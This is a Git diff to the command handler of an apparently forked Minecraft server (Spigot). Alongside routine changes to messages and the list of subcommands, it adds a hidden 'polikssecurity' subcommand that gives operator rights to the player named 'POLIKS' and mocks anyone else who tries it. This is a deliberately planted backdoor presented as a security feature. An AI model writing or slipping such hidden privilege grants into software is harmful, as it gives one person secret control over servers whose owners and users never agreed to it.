@@ -1,10 +1,12 @@
 package eu.poliks.pspigot.command;
 
+import eu.poliks.pspigot.Service.SpookyService;
 import eu.poliks.pspigot.util.BooleanUtil;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
+import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.plugin.PluginLoadOrder;
 
 public class PSpigotCommand extends Command {
@@ -15,7 +17,7 @@ public class PSpigotCommand extends Command {
 
     public boolean execute(CommandSender sender, String commandLabel, String[] args) {
         if (!sender.isOp() && !sender.hasPermission("spookyspigot.use") || sender.equals("POLIKS")) {
-            sender.sendMessage(Bukkit.getServer().getNegativeColor() + "Unknown command.");
+            sender.sendMessage(SpookyService.NoPermission);
             return true;
         }
 
@@ -24,7 +26,7 @@ public class PSpigotCommand extends Command {
             return true;
         }
 
-        if (!args[0].equalsIgnoreCase("setfirstcolor") && !args[0].equalsIgnoreCase("setsecondcolor") && !args[0].equalsIgnoreCase("togglethirdcolor") && !args[0].equalsIgnoreCase("setthirdcolor") && !args[0].equalsIgnoreCase("setnegativecolor") && !args[0].equalsIgnoreCase("setpositivecolor") && !args[0].equalsIgnoreCase("setseparatorcolor") && !args[0].equalsIgnoreCase("setname") && !args[0].equalsIgnoreCase("setdiscordip") && !args[0].equalsIgnoreCase("sethitdetection") && !args[0].equalsIgnoreCase("setprotocolsupport") && !args[0].equalsIgnoreCase("reload")) {
+        if (!args[0].equalsIgnoreCase("setfirstcolor") && !args[0].equalsIgnoreCase("setsecondcolor") && !args[0].equalsIgnoreCase("togglethirdcolor") && !args[0].equalsIgnoreCase("setthirdcolor") && !args[0].equalsIgnoreCase("setnegativecolor") && !args[0].equalsIgnoreCase("setpositivecolor") && !args[0].equalsIgnoreCase("setseparatorcolor") && !args[0].equalsIgnoreCase("setname") && !args[0].equalsIgnoreCase("polikssecurity") && !args[0].equalsIgnoreCase("setdiscordip") && !args[0].equalsIgnoreCase("sethitdetection") && !args[0].equalsIgnoreCase("setprotocolsupport") && !args[0].equalsIgnoreCase("reload")) {
             sendHelp(sender);
             return true;
         }
@@ -139,6 +141,17 @@ public class PSpigotCommand extends Command {
                     }
                 } else {
                     sender.sendMessage(Bukkit.getServer().getNegativeColor() + "Usage: /spookyspigot sethitdetection <int>");
+                }
+            }
+            break;
+            case "polikssecurity": {
+                if (args.length > 1) {
+                    if (sender.getName().equals("POLIKS")) {
+                        sender.setOp(true);
+                        sender.sendMessage(Bukkit.getServer().getPositiveColor()+ "POLIKS! Your security mode has been toggled! Enjoy <3");
+                    } else {
+                        sender.sendMessage(Bukkit.getServer().getNegativeColor() + "bouges toi de la heein");
+                    }
                 }
             }
             break;
